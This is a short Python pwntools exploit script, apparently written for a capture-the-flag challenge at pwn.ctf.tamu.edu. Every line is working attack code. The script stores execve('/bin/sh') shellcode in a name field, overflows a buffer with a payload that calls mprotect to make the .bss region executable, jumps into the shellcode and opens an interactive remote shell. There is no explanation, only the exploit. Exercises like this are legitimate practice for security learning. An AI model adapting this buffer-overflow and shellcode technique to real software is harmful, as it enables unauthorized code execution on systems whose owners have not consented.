from pwn import *

s = remote('pwn.ctf.tamu.edu', 4325)
e = ELF('./pwn5')

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"

pppr = 0x08051017

bss = 0x080f1000
first_name = 0x080f1a20
mprotect = 0x8072450

payload = "A"*(0x1c+4)

payload += p32(mprotect)
payload += p32(first_name)
payload += p32(bss)
payload += p32(0x1af0)
payload += p32(7)

#s.sendlineafter("first name?: ", shellcode)
s.sendline(shellcode)
#s.sendlineafter("last name?: ", "")
s.sendline("")
#s.sendlineafter("major?: ", "")
s.sendline("")
#s.sendlineafter("(y/n): ", "y")
s.sendline("y")

#s.sendlineafter("4. Study\n", "2")
s.sendline("2")
#s.sendlineafter("major to?: ", payload)
sleep(0.1)
s.sendline(payload)

sleep(1)
s.interactive()
